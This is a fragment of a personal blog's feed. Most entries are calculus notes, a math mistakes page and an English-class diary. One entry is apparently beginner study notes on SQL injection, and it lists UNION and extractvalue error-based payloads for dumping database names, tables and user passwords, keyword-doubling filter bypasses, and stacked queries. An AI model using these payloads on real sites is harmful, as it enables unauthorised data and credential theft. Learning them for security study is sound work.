&lt;p&gt;&lt;strong&gt;单调有界准则&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;单调有界数列必有极限。用于证明收敛很有用。&lt;/p&gt;
&lt;p&gt;求极限时可以&lt;strong&gt;先假设存在&lt;/strong&gt;。方便计算。&lt;s&gt;（避免求数列通项）&lt;/s&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;两个重要极限&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/image-20220921223539147.png&#34; alt=&#34;image-20220921223539147&#34; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;第二个很重要，第一个可以直接看成等价无穷小。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第六节&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第六节&#34;&gt;#&lt;/a&gt; 第六节&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;无穷小量&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;确切地说，当自变量 x 无限接近 x&amp;lt;sub&amp;gt;0&amp;lt;/sub&amp;gt;（或 x 的绝对值无限增大）时，函数值 f (x) 与 0 无限接近，即 f (x)→0 (或 f (x)=0)，则称 f (x) 为当 x→x&amp;lt;sub&amp;gt;0&amp;lt;/sub&amp;gt;(或 x→∞) 时的无穷小量。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;等阶无穷小量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;即两个无穷小量坐商得常数时。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;等价无穷小量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;即两个无穷小量坐商得 1。等价无穷小量可互换。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;常见等价无穷小量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://pica.zhimg.com/v2-f20a929bed77e97c61a9f83de9b4b5a4_r.jpg?source=1940ef5c&#34; alt=&#34;aa&#34; title=&#34;等价无穷小&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;em&gt;关于我突然变水的原因&lt;/em&gt;：&lt;/p&gt;
&lt;p&gt;实在是比较忙，各项内容也越来越复杂，所以就择取主要的知识点并舍去证明。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;以上。&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;第二章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二章&#34;&gt;#&lt;/a&gt; 第二章&lt;/h2&gt;
</content>
        <category term="Mathematics" scheme="http://example.com/categories/Mathematics/" />
        <category term="Notes" scheme="http://example.com/tags/Notes/" />
        <updated>2022-09-20T13:18:08.031Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2022/09/20/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0/%E9%94%99%E9%A2%98%E6%9C%AC/</id>
        <title>错题本</title>
        <link rel="alternate" href="http://example.com/2022/09/20/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0/%E9%94%99%E9%A2%98%E6%9C%AC/"/>
        <content type="html">&lt;h1 id=&#34;数学错题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数学错题&#34;&gt;#&lt;/a&gt; 数学错题&lt;/h1&gt;
&lt;h2 id=&#34;高数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#高数&#34;&gt;#&lt;/a&gt; 高数&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/00_5-1663714277821.png&#34; alt=&#34;5&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/00_6-1663714314009.png&#34; alt=&#34;6&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/00_7-1663714323364.png&#34; alt=&#34;7&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/00_8-1663714341842.png&#34; alt=&#34;8&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/01_9-1663714386623.png&#34; alt=&#34;9&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/01_10-1663714362855.png&#34; alt=&#34;10&#34; /&gt;&lt;/p&gt;
</content>
        <category term="Mathematics" scheme="http://example.com/categories/Mathematics/" />
        <category term="Notes" scheme="http://example.com/tags/Notes/" />
        <updated>2022-09-20T13:17:47.044Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2022/09/19/%E5%AD%A6%E4%B9%A0SQL/</id>
        <title>SQL注入</title>
        <link rel="alternate" href="http://example.com/2022/09/19/%E5%AD%A6%E4%B9%A0SQL/"/>
        <content type="html">&lt;h1 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
&lt;h2 id=&#34;1postget注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1postget注入&#34;&gt;#&lt;/a&gt; 1.post&amp;amp;get 注入&lt;/h2&gt;
&lt;p&gt;修改 username 等信息进行无账号登录或构造语句查询敏感数据。&lt;/p&gt;
&lt;p&gt;常用 &lt;code&gt;&#39;&lt;/code&gt; ， &lt;code&gt;&amp;quot;&lt;/code&gt; ， &lt;code&gt;&#39;)&lt;/code&gt; ， &lt;code&gt;&amp;quot;)&lt;/code&gt;  与 “and 1=1；and1=2” 与  &lt;code&gt;-- &#39;&lt;/code&gt;  进行试探～～(可能有双括号)~~&lt;/p&gt;
&lt;p&gt;目的：判断是字符还是整形&lt;/p&gt;
&lt;p&gt;之后用 order by 或 union select 判断段数&lt;/p&gt;
&lt;p&gt;再子查询&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 语句联合查询&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;schema_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;schemata&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查库&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;db&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;column_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;T&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;db&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查字段&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; security&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;users&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查字段内容&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; security&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;users &lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 当显示长度有限制时&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;2extractvalue-报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2extractvalue-报错注入&#34;&gt;#&lt;/a&gt; 2.extractvalue 报错注入&lt;/h2&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;extractvaule 报错注入&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查数据库&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查库的表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;column_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; table_name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查表的字段&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; db&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;extractvalue(content,path)&lt;/code&gt;  这里利用了 &lt;code&gt;path&lt;/code&gt;  错误报错获取信息，利用了 &lt;code&gt;concat&lt;/code&gt;  与 &lt;code&gt;select&lt;/code&gt;  的嵌套&lt;/p&gt;
&lt;p&gt;从而使报错内容 &lt;code&gt;concat&lt;/code&gt;  得以显示。&lt;strong&gt;也就是说错误的是 &lt;code&gt;concat(slect)&lt;/code&gt;  报错时报 &lt;code&gt;concat&lt;/code&gt;  的错但会回显，从而显示 &lt;code&gt;select&lt;/code&gt;  的内容&lt;/strong&gt;，达到获取信息的目的。&lt;/p&gt;
&lt;h2 id=&#34;3绕warf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3绕warf&#34;&gt;#&lt;/a&gt; 3. 绕 warf&lt;/h2&gt;
&lt;p&gt;/**/ 替空格，unionunion 类似绕关键字屏蔽，selselectect 包括。&lt;/p&gt;
&lt;p&gt;base-64，MD5 () 解码。&lt;/p&gt;
&lt;h2 id=&#34;4编码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4编码&#34;&gt;#&lt;/a&gt; 4. 编码&lt;/h2&gt;
&lt;p&gt;%23 -- #   URL 编码&lt;/p&gt;
&lt;h2 id=&#34;5盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5盲注&#34;&gt;#&lt;/a&gt; 5. 盲注&lt;/h2&gt;
&lt;p&gt;使用 Python 脚本&lt;/p&gt;
&lt;h2 id=&#34;6堆叠注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6堆叠注入&#34;&gt;#&lt;/a&gt; 6. 堆叠注入&lt;/h2&gt;
&lt;p&gt;堆叠注入原理&lt;/p&gt;
&lt;p&gt;堆叠注入，顾名思义，就是将语句堆叠在一起进行查询&lt;br /&gt;
原理很简单，mysql_multi_query () 支持多条 sql 语句同时执行，就是个；分隔，成堆的执行 sql 语句，例如&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;show&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;databases&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;就同时执行以上两条命令，所以我们可以增删改查，只要权限够&lt;br /&gt;
虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到 API 或者数据库引擎，又或者权限的限制&lt;em&gt;&lt;strong&gt;只有当调用数据库函数支持执行多条 sql 语句时才能够使用&lt;/strong&gt;&lt;/em&gt;，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，&amp;lt;u&amp;gt; 但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限 &amp;lt;/u&amp;gt;，一旦能够被使用，将可能对网站造成十分大的威胁。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;原文链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjkxMjk0L2FydGljbGUvZGV0YWlscy8xMDczNzYyODQ=&#34;&gt;https://blog.csdn.net/qq_45691294/article/details/107376284&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;7绕过select注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7绕过select注入&#34;&gt;#&lt;/a&gt; 7. 绕过 select 注入&lt;/h2&gt;
&lt;p&gt;使用 handler 语法。&lt;/p&gt;
</content>
        <category term="网络安全" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
        <category term="白帽" scheme="http://example.com/tags/%E7%99%BD%E5%B8%BD/" />
        <updated>2022-09-19T14:18:04.921Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2022/09/08/%E6%9C%AD%E8%AE%B0/%E6%9C%AD%E8%AE%B0/</id>
        <title>My fist English Class</title>
        <link rel="alternate" href="http://example.com/2022/09/08/%E6%9C%AD%E8%AE%B0/%E6%9C%AD%E8%AE%B0/"/>
        <content type="html">&lt;h1 id=&#34;short-talk&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#short-talk&#34;&gt;#&lt;/a&gt; Short Talk&lt;/h1&gt;
&lt;p&gt;(In fact, i want to improve my English through writing some articles in English.)&lt;/p&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;my-teachers&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#my-teachers&#34;&gt;#&lt;/a&gt; My teachers&lt;/h3&gt;
&lt;p&gt;One of my teacher is a &lt;em&gt;Chinese&lt;/em&gt;,while the other one is an &lt;em&gt;English&lt;/em&gt;(maybe,i&#39;m not certain,forgive me)&lt;br /&gt;
When i typing the article you see, i&#39;m taking my foreign teacher&#39;s spoken English class.&lt;/p&gt;
&lt;hr /&gt;
